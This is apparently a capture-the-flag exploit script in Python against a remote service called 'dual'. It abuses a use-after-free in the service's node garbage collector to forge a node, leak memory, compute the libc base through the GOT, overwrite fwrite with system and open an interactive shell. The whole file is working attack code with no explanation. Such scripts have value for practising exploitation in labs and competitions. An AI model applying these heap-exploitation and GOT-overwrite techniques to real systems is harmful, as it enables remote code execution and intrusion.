from braindead import *
log.enable()
args = Args()
args.parse()

#r = io.process(['./dual'])
r = io.connect(('13.231.226.137', 9573))

def create(pred):
	r.sla('op>\n', '1')
	r.sla('pred_id>\n', str(pred))
	return int(r.rl().decode())

def conn(pred, succ):
	r.sla('op>\n', '2')
	r.sla('pred_id>\n', str(pred))
	r.sla('succ_id>\n', str(succ))

def disc(pred, succ):
	r.sla('op>\n', '3')
	r.sla('pred_id>\n', str(pred))
	r.sla('succ_id>\n', str(succ))

def write_text(node_id, text):
	r.sla('op>\n', '4')
	r.sla('node_id>\n', str(node_id))
	r.sla('text_len>\n', str(len(text)))
	r.sa('text>\n', text)

def write_bin(node_id, bin):
	r.sla('op>\n', '5')
	r.sla('node_id>\n', str(node_id))
	r.sla('bin_len>\n', str(len(bin)))
	r.sa('bin>\n', bin)

def read_text(node_id, text_len):
	r.sla('op>\n', '6')
	r.sla('node_id>\n', str(node_id))
	return r.recvn(text_len)

def run_gc():
	r.sla('op>\n', '7')

victimizer = create(0) # @1
pepega = create(0) # @2
write_bin(pepega, "") # @3
not_scanned = create(pepega) # @3
victim = create(not_scanned) # @4

run_gc() # victim@4 is freed

fake_node = bytearray()
fake_node += le.p64(victim) # node_id
fake_node += le.p64(4) # mpo
fake_node += le.p64(0) # ps
fake_node += le.p64(0) # pe
fake_node += le.p64(0) # pc
fake_node += le.p64(1024) # tl
fake_node += le.p64(1) # tpo
fake_node += le.p32(0) # last_used
fake_node += le.p32(0xdeadbeef) # last_used

write_text(victimizer, fake_node) # @4

write_text(0, "A"*256) # @5

bigly_leak = read_text(victim, 1024)
ofs = bigly_leak.find(le.p32(0xdeadbeef))+4
ofs += 16 # malloc padding
ofs += 8*5 # ptr of www.text


GOT = 0x0000000000519000
#GOT =        0xdeadbeef
bigly_write = bigly_leak[:ofs] + le.p64(GOT) + bigly_leak[ofs+8:]
write_text(victim, bigly_write)

got_leak = read_text(0, 256)
got_fwrite_ofs = 0x98

libc_fwrite = 0x00086480
libc_system = 0x00055410

libc = le.u64(got_leak[got_fwrite_ofs:got_fwrite_ofs+8]) - libc_fwrite

log.success('libc is at %s', hex(libc))

got_write = bytearray(got_leak)
got_write[got_fwrite_ofs:got_fwrite_ofs+8] = le.p64(libc + libc_system)

write_text(0, got_write)

write_text(victim, b"sh\x00")
read_text(victim, 0)

io.interactive(r)
